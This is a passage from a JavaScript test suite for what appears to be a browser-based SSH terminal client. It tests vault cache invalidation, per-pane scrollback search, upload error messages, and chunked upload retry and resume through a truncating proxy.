  ok(win._idbHasKeyCache === false,
     '_idbHasKeyCache reset by invalidateVaultCache on pageshow');
  // _vaultIdCache also reset; ensureVaultIdIfPresent now falls through
  // to the (empty) IDB and returns null.
  const afterRestore = await win.eval('ensureVaultIdIfPresent()');
  ok(afterRestore === null,
     '_vaultIdCache invalidated; ensureVaultIdIfPresent() returns null after restore (got=' + afterRestore + ')');
  // Async leg: after _refreshIdbHasKey resolves, _idbHasKeyCache stays
  // false (IDB really is empty now) and the re-render greys the row.
  await sleep(40);
  const rowsAfter = win.document.querySelectorAll('.sv');
  ok(rowsAfter.length === 1, 'saved card row still present after re-render');
  ok(rowsAfter[0].classList.contains('nokey'),
     'row greyed out after bfcache restore + IDB refresh');
  await closeDom(dom);
});

test('F6: "status code" mapping tests actually exercise error-string mapping', async () => {
  // Documentary test: api() always parses JSON and ignores HTTP status.
  // If a future refactor exposes status to dispatch, this test should
  // start failing (it asserts the same dispatch as the existing three
  // mapping tests, using a deliberately mismatched status semantic via
  // a plan that only specifies `error:`).
  let connectBody = null;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (b) => { connectBody = b; return {error: 'vault_decrypt_failed'}; }, once: true},
  ];
  const env = await mkEnv(plan); const win = env.win;
  await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  await sleep(80);
  ok(connectBody && connectBody.vault_id, 'saved-variant connect body was POSTed');
  ok($(win, 'tmTitle').textContent === 'Cannot decrypt this card',
     'error-string dispatch is what is exercised (not status code)');
  cleanup(env);
});

// =====================================================================
// Scrollback search (PR #72 review-followup)
// =====================================================================

// Helper: bring up two connected non-persistent panes (A then split→B).
async function _twoPanes(win) {
  $(win, 'iH').value = 'a.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const a = paneList(win)[0];
  if (!a) return [null, null];
  win.splitPane(a.id, 'h');
  await sleep(10);
  $(win, 'iH').value = 'b.host'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const all = paneList(win);
  const b = all.find(p => p.id !== a.id);
  return [a, b];
}

const SEARCH_PANE_PLAN = () => ([
  {action: 'config', response: {restrict_hosts: false, connections: []}},
  {action: 'connect', match: b => b.host === 'a.host',
   response: {session_id: 'sa', alive: true}, once: true},
  {action: 'connect', match: b => b.host === 'b.host',
   response: {session_id: 'sb', alive: true}, once: true},
  {action: 'resize', response: {ok: true}},
  {action: 'output', response: {data: '', alive: true}},
  {action: 'disconnect', response: {ok: true}},
]);

test('search bar: pane switch hides outgoing pane search and clears its decorations', async () => {
  // gorevds review #1: toggleSearch / closeSearch only act on the active
  // pane. Without coupling to activatePane, opening search on A then
  // switching to B leaves A's bar visible — and the next Escape clears B's
  // (now-active) decorations instead of A's.
  const env = await mkEnv(SEARCH_PANE_PLAN()); const win = env.win;
  const [a, b] = await _twoPanes(win);
  if (!a || !b) { ok(false, 'two panes needed'); cleanup(env); return; }
  win.activatePane(a.id);
  win.toggleSearch();
  const aBar = a.el.querySelector('[data-search]');
  ok(!aBar.classList.contains('h'), 'A search bar visible after toggle');
  const beforeClears = a.searchAddon.clearDecorationsCalls;
  win.activatePane(b.id);
  ok(aBar.classList.contains('h'), 'A search bar hidden after switching to B');
  ok(a.searchAddon.clearDecorationsCalls === beforeClears + 1,
     'A clearDecorations called exactly once on switch, got delta=' +
     (a.searchAddon.clearDecorationsCalls - beforeClears));
  cleanup(env);
});

test('search bar: pane switch is a no-op when outgoing search was already closed', async () => {
  // Guard against gratuitous clearDecorations calls on every pane switch.
  const env = await mkEnv(SEARCH_PANE_PLAN()); const win = env.win;
  const [a, b] = await _twoPanes(win);
  if (!a || !b) { ok(false, 'two panes needed'); cleanup(env); return; }
  win.activatePane(a.id);
  const beforeClears = a.searchAddon.clearDecorationsCalls;
  win.activatePane(b.id);
  ok(a.searchAddon.clearDecorationsCalls === beforeClears,
     'A clearDecorations NOT called when search was closed, got delta=' +
     (a.searchAddon.clearDecorationsCalls - beforeClears));
  cleanup(env);
});

test('searchNext passes decorations option for highlight-all', async () => {
  // gorevds review #3: findNext is called with only the query, no
  // decorations — so only the current match highlights, the PR
  // description's "highlight-all" / highlightLimit note becomes moot, and
  // clearDecorations() in closeSearch is dead code. The fix passes a
  // decorations object so highlight-all is actually engaged.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  if (!p) { ok(false, 'pane needed'); cleanup(env); return; }
  win.toggleSearch();
  p.el.querySelector('[data-search] input').value = 'foo';
  win.searchNext();
  const calls = p.searchAddon.findNextCalls;
  ok(calls.length === 1, 'findNext called once, got ' + calls.length);
  ok(calls[0] && calls[0].query === 'foo', 'query=foo, got ' + (calls[0] && calls[0].query));
  ok(calls[0] && calls[0].opts && calls[0].opts.decorations,
     'opts.decorations passed (enables highlight-all); got opts=' +
     JSON.stringify(calls[0] && calls[0].opts));
  cleanup(env);
});

test('searchPrev passes decorations option for highlight-all', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  if (!p) { ok(false, 'pane needed'); cleanup(env); return; }
  win.toggleSearch();
  p.el.querySelector('[data-search] input').value = 'bar';
  win.searchPrev();
  const calls = p.searchAddon.findPrevCalls;
  ok(calls.length === 1, 'findPrevious called once, got ' + calls.length);
  ok(calls[0] && calls[0].query === 'bar', 'query=bar');
  ok(calls[0] && calls[0].opts && calls[0].opts.decorations,
     'opts.decorations passed; got opts=' +
     JSON.stringify(calls[0] && calls[0].opts));
  cleanup(env);
});

test('toggleSearch shows then hides the active pane search bar', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  if (!p) { ok(false, 'pane needed'); cleanup(env); return; }
  const bar = p.el.querySelector('[data-search]');
  ok(bar.classList.contains('h'), 'bar hidden on boot');
  win.toggleSearch();
  ok(!bar.classList.contains('h'), 'bar visible after first toggle');
  win.toggleSearch();
  ok(bar.classList.contains('h'), 'bar hidden after second toggle');
  ok(p.searchAddon.clearDecorationsCalls >= 1,
     'closeSearch path clears decorations (>=1), got ' + p.searchAddon.clearDecorationsCalls);
  cleanup(env);
});

test('Ctrl+Shift+F triggers toggleSearch', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  if (!p) { ok(false, 'pane needed'); cleanup(env); return; }
  const bar = p.el.querySelector('[data-search]');
  ok(bar.classList.contains('h'), 'bar hidden before chord');
  const ev = new win.KeyboardEvent('keydown',
    {key: 'F', ctrlKey: true, shiftKey: true, bubbles: true, cancelable: true});
  win.document.body.dispatchEvent(ev);
  ok(!bar.classList.contains('h'), 'bar visible after Ctrl+Shift+F');
  cleanup(env);
});

test('Enter inside search input dispatches findNext, Shift+Enter dispatches findPrevious', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  if (!p) { ok(false, 'pane needed'); cleanup(env); return; }
  win.toggleSearch();
  const input = p.el.querySelector('[data-search] input');
  input.value = 'needle';
  const enter = new win.KeyboardEvent('keydown',
    {key: 'Enter', bubbles: true, cancelable: true});
  input.dispatchEvent(enter);
  ok(p.searchAddon.findNextCalls.length === 1, 'Enter → findNext, got ' +
     p.searchAddon.findNextCalls.length);
  const shiftEnter = new win.KeyboardEvent('keydown',
    {key: 'Enter', shiftKey: true, bubbles: true, cancelable: true});
  input.dispatchEvent(shiftEnter);
  ok(p.searchAddon.findPrevCalls.length === 1, 'Shift+Enter → findPrevious, got ' +
     p.searchAddon.findPrevCalls.length);
  cleanup(env);
});

test('Escape inside search input closes the bar', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  if (!p) { ok(false, 'pane needed'); cleanup(env); return; }
  win.toggleSearch();
  const bar = p.el.querySelector('[data-search]');
  ok(!bar.classList.contains('h'), 'bar visible after toggle');
  const input = bar.querySelector('input');
  const esc = new win.KeyboardEvent('keydown',
    {key: 'Escape', bubbles: true, cancelable: true});
  input.dispatchEvent(esc);
  ok(bar.classList.contains('h'), 'bar hidden after Escape inside input');
  cleanup(env);
});

// =====================================================================
// Upload error reporting: the banner must name the actual problem, not a
// generic "Upload failed". describeUploadError() turns a failed XHR +
// server {error} into a specific, human reason; finishUpload() renders it.

test('describeUploadError: status 0, no bytes sent → read/reach failure', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError({status: 0}, null, {fileOffset: 0, fileSize: 100});
  ok(r.indexOf('could not start the upload') === 0 && r.indexOf('iCloud') !== -1,
     'status 0 / 0 bytes points at iCloud/connection; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: status 0, partial bytes → stopped at pct', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError({status: 0}, null, {fileOffset: 50, fileSize: 200});
  ok(r === 'the upload stopped at 25% (connection dropped, or the file became unreadable)',
     'partial; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: partial pct clamps to 1..99 (no 0% / 100%)', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const tiny = win.describeUploadError({status: 0}, null, {fileOffset: 1, fileSize: 1e9});
  const huge = win.describeUploadError({status: 0}, null, {fileOffset: 999999999, fileSize: 1e9});
  ok(tiny.indexOf('at 1%') !== -1, 'tiny chunk clamps to 1%; got ' + JSON.stringify(tiny));
  ok(huge.indexOf('at 99%') !== -1, 'near-complete clamps to 99%; got ' + JSON.stringify(huge));
  cleanup(env);
});

test('describeUploadError: non-string resp.error falls back to HTTP status', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError({status: 502}, {error: {nested: 'oops'}}, {});
  ok(r === 'server error (HTTP 502)', 'no [object Object]; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: server "file too large" → plain language', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError({status: 413}, {error: 'file too large'}, {});
  ok(r === 'file is larger than the server allows', 'too large; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: server "empty body" → the file is empty', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError({status: 400}, {error: 'empty body'}, {});
  ok(r === 'the file is empty', 'empty; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: dead session → session no longer connected', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r1 = win.describeUploadError({status: 502}, {error: 'session is dead'}, {});
  const r2 = win.describeUploadError({status: 404}, {error: 'session not found'}, {});
  ok(r1 === 'the terminal session is no longer connected', 'dead; got ' + JSON.stringify(r1));
  ok(r2 === 'the terminal session is no longer connected', 'notfound; got ' + JSON.stringify(r2));
  cleanup(env);
});

test('describeUploadError: side-channel timeout → timed out sending', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError({status: 502}, {error: 'ssh side-channel timeout'}, {});
  ok(r === 'timed out sending the file to the host', 'timeout; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: short-count → interrupted before all bytes', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError(
    {status: 502}, {error: 'client sent fewer bytes than Content-Length'}, {});
  ok(r === 'the upload was interrupted before all bytes arrived',
     'short-count; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: ssh exit keeps verbatim host reason', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError(
    {status: 502}, {error: 'ssh exit 1: No space left on device'}, {});
  ok(r.indexOf('No space left on device') !== -1,
     'ssh exit reason preserved; got ' + JSON.stringify(r));
  cleanup(env);
});

test('describeUploadError: no JSON body → falls back to HTTP status', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const r = win.describeUploadError({status: 502}, null, {});
  ok(r === 'server error (HTTP 502)', 'no-body fallback; got ' + JSON.stringify(r));
  cleanup(env);
});

test('finishUpload renders the specific reason in the banner', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.upload = {staged: [], placed: []};
  win.finishUpload(p, false, 'file is larger than the server allows');
  const text = p.el.querySelector('[data-upload-progress] .upload-progress-text');
  ok(text.textContent === 'Upload failed: file is larger than the server allows',
     'specific reason rendered; got ' + JSON.stringify(text.textContent));
  cleanup(env);
});

test('finishUpload with no reason keeps the bare failure message', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.upload = {staged: [], placed: []};
  win.finishUpload(p, false);
  const text = p.el.querySelector('[data-upload-progress] .upload-progress-text');
  ok(text.textContent === 'Upload failed', 'bare message; got ' + JSON.stringify(text.textContent));
  cleanup(env);
});

test('upload network error surfaces a specific reason (iPhone case)', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  // Minimal XHR fake: send() drives the outcome via the injected behavior.
  let captured = null;
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 0; this.responseText = ''; }
    open() {} setRequestHeader() {} abort() {}
    send() { captured = this; if (this.onerror) this.onerror(); }
  };
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.sid = 's1'; p.host = 'h';
  win.handleUpload(p.id, {files: [{name: 'aidoc.pdf', size: 15000000}], value: ''});
  await sleep(5);
  const text = p.el.querySelector('[data-upload-progress] .upload-progress-text');
  ok(text.textContent.indexOf('Upload failed: could not start the upload') === 0
     && text.textContent.indexOf('iCloud') !== -1,
     'network-error reason names iCloud/connection; got ' + JSON.stringify(text.textContent));
  ok(captured !== null, 'xhr.send was reached');
  cleanup(env);
});

// Real XHR fires xhr.upload.onprogress (setting u.fileOffset) before
// onerror — this exercises that whole chain so "stopped at N%" is proven
// end-to-end, not just in the formatter.
test('upload mid-stream drop reports the percentage reached (onprogress chain)', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 0; this.responseText = ''; }
    open() {} setRequestHeader() {} abort() {}
    send() {
      if (this.upload.onprogress) this.upload.onprogress({loaded: 3000000});
      if (this.onerror) this.onerror();
    }
  };
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.sid = 's1'; p.host = 'h';
  win.handleUpload(p.id, {files: [{name: 'mid.bin', size: 12000000}], value: ''});
  await sleep(5);
  const text = p.el.querySelector('[data-upload-progress] .upload-progress-text');
  ok(text.textContent === 'Upload failed: the upload stopped at 25% (connection dropped, or the file became unreadable)',
     'mid-stream pct from onprogress; got ' + JSON.stringify(text.textContent));
  cleanup(env);
});

// finalize succeeded the upload (200) but the move into cwd failed — the
// banner must say bytes landed, not bare "Upload failed", and must not
// leak "$HOME" or the raw server string.
// ── Upload in pieces ─────────────────────────────────────────────────
// A corporate proxy / VPN cut one long POST mid-body every time; the
// file now goes up in pieces, each retried on its own, resumed from the
// size the server reports.
function pieceServer(win, script) {
  // script(offset, len, n) -> {status, body} | 'neterr' | 'timeout'
  const st = {calls: [], file: [], finalized: 0};
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 0; this.responseText = ''; }
    open(m, url) { this.url = url; }
    setRequestHeader() {}
    abort() { this.aborted = true; }
    send(blob) {
      const m = this.url.match(/offset=(\d+)/);
      const offset = m ? +m[1] : null;
      const len = blob.size;
      const n = st.calls.length;
      const target = new URL(this.url, 'https://websh.test/').searchParams.get('path');
      st.calls.push({offset, len, path: target});
      const r = script(offset, len, n, target);
      setTimeout(() => {
        if (this.aborted) return;
        if (r === 'neterr') { if (this.onerror) this.onerror(); return; }
        if (r === 'timeout') { if (this.ontimeout) this.ontimeout(); return; }
        if (r.status === 200) {
          if (offset === null) st.file = [[0, len]];
          else { if (offset === 0) st.file = []; st.file.push([offset, len]); }
        }
        this.status = r.status; this.responseText = JSON.stringify(r.body);
        if (this.onload) this.onload();
      }, 2);
    }
  };
  return st;
}
const bigFile = (name, size) => ({name, size, slice: (a, b) => ({size: b - a, start: a})});
const assembled = st => {   // contiguous, no gaps, no overlaps -> total
  let pos = 0;
  for (const [o, l] of st.file) { if (o !== pos) return -1; pos += l; }
  return pos;
};
async function pieceEnv(extraPlan) {
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: [], upload_chunks: true}},
    {action: 'upload_finalize', response: {ok: true, path: '/home/u/big.bin'}},
  ].concat(extraPlan || []));
  const win = env.win;
  win.UPLOAD_CHUNK_BYTES = 4 * 1024 * 1024; win.UPLOAD_CHUNK_TIMEOUT_MS = 50; win.UPLOAD_RETRY_BASE_MS = 2;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 's1'; p.host = 'h'; p.persistent = true; p.cwd = '/home/u';
  return {env, win, p};
}
const bannerOf = p => (p.el.querySelector('[data-upload-progress] .upload-progress-text') || {}).textContent || '';
async function uploadSettles(p, log) {
  for (let i = 0; i < 800; i++) { await sleep(10); if (/Upload (complete|failed|cancelled)|Uploaded|Saved to/i.test(bannerOf(p))) return; }
}

test('upload in pieces: a 10 MB file goes up as three offsets, once each', async () => {
  const {env, win, p} = await pieceEnv();
  const st = pieceServer(win, (offset, len) => ({status: 200, body: {ok: true, size: offset + len}}));
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(st.calls.map(c => c.offset).join(',') === '0,4194304,8388608', 'offsets 0, 4M, 8M; got ' + st.calls.map(c => c.offset).join(','));
  ok(assembled(st) === 10 * 1024 * 1024, 'every byte once, in order');
  ok(env.log.filter(e => e.action === 'upload_finalize').length === 1, 'finalized once');
  ok(/Saved to \/home\/u\/big.bin/.test(bannerOf(p)), 'banner says done; got ' + JSON.stringify(bannerOf(p)));
  cleanup(env);
});

test('upload in pieces: a piece cut by the network is retried, then in smaller pieces', async () => {
  const {env, win, p} = await pieceEnv();
  let fails = 0;
  const st = pieceServer(win, (offset, len, n) => {
    if (offset === 4194304 && fails < 3) { fails++; return 'neterr'; }   // the 2nd piece dies three times
    return {status: 200, body: {ok: true, size: offset + len}};
  });
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(assembled(st) === 10 * 1024 * 1024, 'file complete despite three failures; pieces=' + JSON.stringify(st.file));
  const sizes = st.calls.filter(c => c.offset === 4194304).map(c => c.len);
  ok(sizes[0] === 4194304 && sizes[sizes.length - 1] < 4194304, 'retries shrink the piece; sizes at 4M: ' + sizes.join(','));
  ok(/Saved to/.test(bannerOf(p)), 'done; got ' + JSON.stringify(bannerOf(p)));
  cleanup(env);
});

test('upload in pieces: 409 with the real size resumes from there, nothing doubled', async () => {
  const {env, win, p} = await pieceEnv();
  let refused = false;
  const st = pieceServer(win, (offset, len) => {
    if (offset === 4194304 && !refused) {
      refused = true;
      // The previous attempt landed 1000 bytes of this piece before dying.
      st.file.push([4194304, 1000]);
      return {status: 409, body: {error: 'offset mismatch', size: 4194304 + 1000}};
    }
    return {status: 200, body: {ok: true, size: offset + len}};
  });
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(st.calls.some(c => c.offset === 4194304 + 1000), 'resumed at the reported size; offsets=' + st.calls.map(c => c.offset).join(','));
  ok(assembled(st) === 10 * 1024 * 1024, 'contiguous, complete');
  cleanup(env);
});

test('upload in pieces: an oversized staging file is not retried or finalized under the same name', async () => {
  const {env, win, p} = await pieceEnv();
  const size = 10 * 1024 * 1024;
  let occupied = null;
  const st = pieceServer(win, (offset, len, n, target) => {
    if (occupied === null) occupied = target;
    if (target === occupied) return {status: 409, body: {error: 'offset mismatch', size: size + 1}};
    return {status: 200, body: {ok: true, size: offset + len}};
  });
  try {
    win.handleUpload(p.id, {files: [bigFile('big.bin', size)], value: ''});
    await uploadSettles(p, env.log);
    ok(st.calls.filter(c => c.path === occupied).length === 1,
       'an oversized staging file is left alone after the mismatch; calls=' + st.calls.length);
    ok(st.calls.length <= 8, 'recovery finishes within a bounded request count');
    ok(/Upload failed|Saved to/.test(bannerOf(p)), 'a clear terminal result is shown; got ' + JSON.stringify(bannerOf(p)));
    ok(!env.log.some(e => e.action === 'upload_finalize' && e.body && e.body.tmp === occupied),
       'the unrelated staged file is never finalized as the selected file');
  } finally { cleanup(env); }
});

test('upload in pieces: 429 (rate limit) waits and keeps the piece size', async () => {
  const {env, win, p} = await pieceEnv();
  const realST = win.setTimeout;
  const waits = [];
  win.setTimeout = (fn, ms) => realST(fn, ms >= 3000 ? (waits.push(ms), 5) : ms);
  let limited = 0;
  const st = pieceServer(win, (offset, len) => {
    if (offset === 4194304 && limited < 2) { limited++; return {status: 429, body: {error: 'rate_limited', code: 'rate_limited'}}; }
    return {status: 200, body: {ok: true, size: offset + len}};
  });
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  win.setTimeout = realST;
  ok(waits.filter(x => x === 3000).length === 2, 'waited 3 s twice; got ' + JSON.stringify(waits));
  const sizes = st.calls.filter(c => c.offset === 4194304).map(c => c.len);
  ok(sizes.every(x => x === 4194304), 'piece size unchanged; got ' + sizes.join(','));
  ok(assembled(st) === 10 * 1024 * 1024 && /Saved to/.test(bannerOf(p)), 'complete');
  cleanup(env);
});

test('upload in pieces: the last piece landed but its reply was lost - finalized, not failed', async () => {
  const {env, win, p} = await pieceEnv();
  let lost = false;
  const st = pieceServer(win, (offset, len) => {
    if (offset === 8388608 && !lost) { lost = true; st.file.push([offset, len]); return 'neterr'; }   // landed, reply lost
    if (offset === 8388608) return {status: 409, body: {error: 'offset mismatch', size: 10 * 1024 * 1024}};
    return {status: 200, body: {ok: true, size: offset + len}};
  });
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(/Saved to/.test(bannerOf(p)), 'finalized; got ' + JSON.stringify(bannerOf(p)));
  ok(!st.calls.some(c => c.offset === 10 * 1024 * 1024), 'no empty piece at the end; offsets=' + st.calls.map(c => c.offset).join(','));
  ok(assembled(st) === 10 * 1024 * 1024, 'complete');
  cleanup(env);
});

test('upload in pieces: a final answer (413) stops the upload, no retries', async () => {
  const {env, win, p} = await pieceEnv();
  const st = pieceServer(win, () => ({status: 413, body: {error: 'file too large'}}));
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(st.calls.length === 1, 'one request; got ' + st.calls.length);
  ok(/larger than the server allows/.test(bannerOf(p)), 'reason shown; got ' + JSON.stringify(bannerOf(p)));
  cleanup(env);
});

// Repeated per-piece timeouts (the server never answers) are a cut like
// any other: the client shrinks, then gives up with the visible,
// proxy-named banner in FEWER than the full try budget - not a bare "no
// answer" after 8 attempts. (Was: 8 tries, generic message - the
// pre-fix behaviour.)
test('upload in pieces: repeated timeouts give up fast with the proxy-named banner', async () => {
  const {env, win, p} = await pieceEnv();
  const st = pieceServer(win, () => 'timeout');
  win.UPLOAD_CHUNK_TIMEOUT_MS = 5;
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  for (let i = 0; i < 2000 && !/Upload (failed|blocked)|cut short/i.test(bannerOf(p)); i++) await sleep(10);
  ok(/blocked|cut short|proxy|firewall/i.test(bannerOf(p)), 'gave up with the proxy-named banner; got ' + JSON.stringify(bannerOf(p)));
  ok(st.calls.length < 8, 'fewer than the full try budget (UPLOAD_CHUNK_TRIES=8); got ' + st.calls.length);
  cleanup(env);
});

// ── Proxy that truncates uploads (B: shrink through; A: fast, named failure) ──
// Measured on the owner's corporate network: GET (download) of a 1.2 MB
// file works; a POST upload of a normal file is cut by a proxy while a
// couple-of-KB file passes - so the proxy limits by SIZE/DURATION, not
// outright. nginx logs the first 4 MB piece as 400 ("client sent fewer
// bytes than Content-Length") or 499, retried every ~2 min, 6×, then it
// gives up; the progress bar sits at 0% with no message for many minutes.
// These are the UNIT layer for the client's shrink / give-up / banner
// logic (the logic lives in websh.js, not server.py). The honest
// wall-clock + real-bytes reproduction is tests/e2e/scenarios/proxytrunc.mjs.

// B. A piece cut by the proxy must shrink on the VERY NEXT try, not only
// after a second generic failure. Proxy model: any body over 1 MB is
// dropped (status 0 / onerror), smaller bodies pass.
test('upload in pieces: a truncated piece shrinks on the next try, not after a second failure', async () => {
  const {env, win, p} = await pieceEnv();
  const TH = 1024 * 1024;
  const st = pieceServer(win, (offset, len) =>
    len > TH ? 'neterr' : {status: 200, body: {ok: true, size: offset + len}});
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  const at0 = st.calls.filter(c => c.offset === 0).map(c => c.len);
  ok(at0.length >= 2, 'the first piece was retried; sizes at offset 0: ' + at0.join(','));
  ok(at0[1] < at0[0], 'the retry after the FIRST truncation is smaller; sizes at offset 0: ' + at0.join(','));
  cleanup(env);
});

// B. The owner's exact signature: nginx returns 400 "client sent fewer
// bytes than Content-Length" for an over-size piece. That is a proxy
// truncation, not a final client error - the client must shrink and
// retry (not give up), and a file that gets through this way must be
// byte-for-byte complete. Proxy model: 400 for any body over 512 KB on
// EVERY offset, 200 otherwise (so the shrunk size must persist across
// pieces - forward progress keeps the small size, it is not re-grown and
// re-truncated on every piece).
test('upload in pieces: a 400 "fewer bytes" truncation shrinks and the file still completes whole', async () => {
  const {env, win, p} = await pieceEnv();
  const TH = 512 * 1024;
  const st = pieceServer(win, (offset, len) =>
    len > TH
      ? {status: 400, body: {error: 'client sent fewer bytes than Content-Length'}}
      : {status: 200, body: {ok: true, size: offset + len}});
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(st.calls.length > 1, 'the 400 was retried, not treated as final; requests: ' + st.calls.length);
  ok(assembled(st) === 10 * 1024 * 1024,
     'every byte landed once, in order, after shrinking; pieces=' + JSON.stringify(st.file));
  ok(/Saved to/.test(bannerOf(p)), 'upload completed; banner=' + JSON.stringify(bannerOf(p)));
  const n400 = st.calls.filter(c => c.len > TH).length;
  ok(n400 <= 6, 'the shrunk size persists across pieces (not re-truncated each time); over-size requests: ' + n400);
  // Keep-size: every piece after the first offset is <= the size that
  // got through (<= TH); the client does not re-grow to 4 MB and get
  // truncated again on each piece.
  ok(st.calls.filter(c => c.offset > 0).every(c => c.len <= TH),
     'pieces after offset 0 stay at the shrunk size (<= ' + TH + '); got ' +
